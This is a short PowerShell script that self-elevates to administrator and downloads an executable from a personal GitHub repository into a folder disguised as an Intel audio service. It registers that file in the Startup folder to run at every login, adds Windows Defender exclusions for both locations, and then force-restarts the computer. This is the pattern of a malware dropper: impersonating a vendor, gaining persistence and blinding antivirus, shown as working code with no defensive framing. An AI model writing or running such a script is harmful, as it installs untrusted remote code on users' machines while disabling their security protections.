clear
# Self-elevate the script if required
if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
      if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) {
       $CommandLine = "-File `"" + $MyInvocation.MyCommand.Path + "`" " + $MyInvocation.UnboundArguments
       Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList $CommandLine
       Exit
      }
     }
     
     # Remainder of script here

      if (-Not (test-path -PathType container "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Service")) {
            New-Item -ItemType Directory -Path "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Service"
      }

      if (-Not (test-path -PathType Any "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Service\intelaudioservice.exe")) {
            Invoke-WebRequest -uri "https://github.com/B95segal/intelaudioservice/blob/main/dist/intelaudioservice.exe" -OutFile "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Service\IntelAudioService.exe"  
      }


      $WScriptShell = New-Object -ComObject WScript.Shell
      $FolderPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
      $ShortcutFile = "$FolderPath\Intel Audio Service.lnk"
      $TargetFile = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Service\intelaudioservice.exe"
      
      If(!(Test-Path $FolderPath)) {
          New-Item -ItemType Directory -Force -Path $FolderPath
      }
      
      $Shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
      $Shortcut.TargetPath = $TargetFile
      $Shortcut.Arguments = ""
      $Shortcut.WorkingDirectory = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Service"
      $Shortcut.IconLocation = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Service\intelaudioservice.exe,0"
      $Shortcut.Save()

      Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Service\"
      Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" 
      Restart-Computer -Force
